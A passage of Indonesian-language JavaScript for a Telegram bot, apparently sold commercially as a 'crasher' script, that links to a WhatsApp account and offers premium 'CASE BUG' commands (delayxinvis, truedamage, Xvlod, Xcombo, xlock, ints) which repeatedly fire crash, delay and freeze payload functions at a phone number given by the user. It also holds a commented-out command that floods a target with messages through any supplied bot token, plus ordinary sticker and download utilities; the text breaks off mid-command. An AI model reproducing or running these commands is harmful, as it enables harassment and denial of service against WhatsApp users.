    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Group Sudah di Safe");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE Group dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
///// ×××××÷×××××××× ////
bot.command("cmdaktif", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /cmdaktif truedamage janggan /truedamage");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (!disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah aktif`);
  }

  data.disabled = disabled.filter(c => c !== cmd);
  saveCmdMode(data);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command("nonaktifcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /nonaktifcmd truedamage janggan /truedamage");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah nonaktif`);
  }

  disabled.push(cmd);

  data.disabled = disabled;
  saveCmdMode(data);

  ctx.reply(`⛔ Command /${cmd} berhasil dinonaktifkan`);
});
//// Tools ///
/*bot.command("bratvid", async (ctx) => {
  const chatId = ctx.chat.id;

  
  const text = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  
  if (!text) {
    return ctx.reply(
      "⚠️ Contoh:\n/bratvid woi kontol"
    );
  }

  
  await ctx.reply(
    "🎬 Lagi bikin sticker videonya bre..."
  );

  try {
   
    const res = await fetch(
      `https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(
        text
      )}`
    );

   
    if (!res.ok) {
      throw new Error(
        `HTTP error ${res.status}`
      );
    }

  
    const buffer = Buffer.from(
      await res.arrayBuffer()
    );

  
    const tmpFile = path.join(
      __dirname,
      `bratvid_${Date.now()}.webm`
    );

    fs.writeFileSync(
      tmpFile,
      buffer
    );

  
    await ctx.replyWithSticker(
      {
        source: tmpFile
      }
    );

  
    fs.unlinkSync(
      tmpFile
    );

  } catch (e) {
    console.error(
      "BRATVID ERROR:",
      e
    );

    return ctx.reply(
      "❌ Gagal generate sticker video."
    );
  }
});

bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "✨ Background berhasil dihapus!"
      }
    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});

bot.command("livejam", async (ctx) => {
  const chatId = ctx.chat.id;


  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
  }

  const msg = await ctx.reply(getTimeIndonesia());

  liveIntervals[chatId] = setInterval(async () => {
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        getTimeIndonesia()
      );
    } catch (e) {
      clearInterval(liveIntervals[chatId]);
      delete liveIntervals[chatId];
    }
  }, 3000); 
});

bot.command("stopjam", (ctx) => {
  const chatId = ctx.chat.id;

  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
    delete liveIntervals[chatId];
    ctx.reply("⛔ Live clock dihentikan");
  } else {
    ctx.reply("❌ Tidak ada live clock yang aktif");
  }
});

bot.command("listharga", (ctx) => {
  ctx.reply(`
<pre>💰 LIST HARGA TITLE ATOMIC

━━━━━━━━━━━━━━━
5K NO UPDATE
10K FULL UPADATE 
15K RESELLER SC 
25K PATNER SC
35K OWNER SC
45K MODERATOR SC
━━━━━━━━━━━━━━━
Order: @pacenicwlee
</pre>`, { parse_mode: "HTML" });
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Atomic Crashers ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("enc", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
      return ctx.reply("❌ Reply file .js dengan command /enc");
    }

    const doc = reply.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const file = await ctx.telegram.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const res = await axios.get(fileUrl);
    let code = res.data;

    if (!code || code.length < 5) {
      return ctx.reply("❌ File kosong / tidak valid");
    }

    await ctx.reply("🔐 Encrypt aman sedang berjalan...");

  
    code = `/ Protected Script - ${ctx.from.first_name} /\n` + code;

    const obf = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: true,
      stringArray: true,
      stringArrayEncoding: ["base64"],
      stringArrayThreshold: 0.75,
      stringArrayShuffle: true,
      splitStrings: true,
      splitStringsChunkLength: 5
    });

    const result = obf.getObfuscatedCode();

    await ctx.replyWithDocument({
      source: Buffer.from(result, "utf8"),
      filename: "enc_safe.js"
    }, {
      caption: "✅ Encrypt berhasil (reply mode)\n🔒 Stabil & Aman"
    });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal encrypt");
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});/**/

bot.command("cekid", async (ctx) => {
  try {
    let target = ctx.from;

   
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id;
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const username = target.username ? `@${target.username}` : "Tidak ada username";
    const fullName = `${firstName} ${lastName}`.trim();

    const teks = `
<blockquote><strong>「 CEK USER ID 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💬 Chat ID: <code>${ctx.chat.id}</code>
    `;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKID ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek ID\n${e.message}`
    );
  }
});
/// Connect ////
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://h.uguu.se/efToQTeR.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀 𝐈𝐍𝐕𝐋𝐀𝐒𝐈𝐎𝐍 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SENSASION 

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});

/// ------ Kill Sesi -------- ///
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// CASE BUG ///
bot.command("delayxinvis", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /delayxinvis 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await ImageDelayinvisNewVnX(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("truedamage", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /truedamage 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await KayzenTryGes(sock, target);
      await sleep(800);
      await ImageDelayinvisNewVnX(sock, target)
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("Xvlod", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Xvlod 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 140; i++) {
      await delayhard(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("Xcombo", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /Xcombo 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo fuction 
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo fuction 
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
      await DelayInvisV1(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///
bot.command("xlock", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xlock 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xlock
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Forcelose Click
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 70% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xlock 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Forcelose click
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 70% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 50; i++) {
      await VnXPaymentFrezeeNew(sock, target);
        await new Promise(r => setTimeout(r, 1200));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG  ///
bot.command("ints", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /ints 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /ints 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash system
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /ints 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash system
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
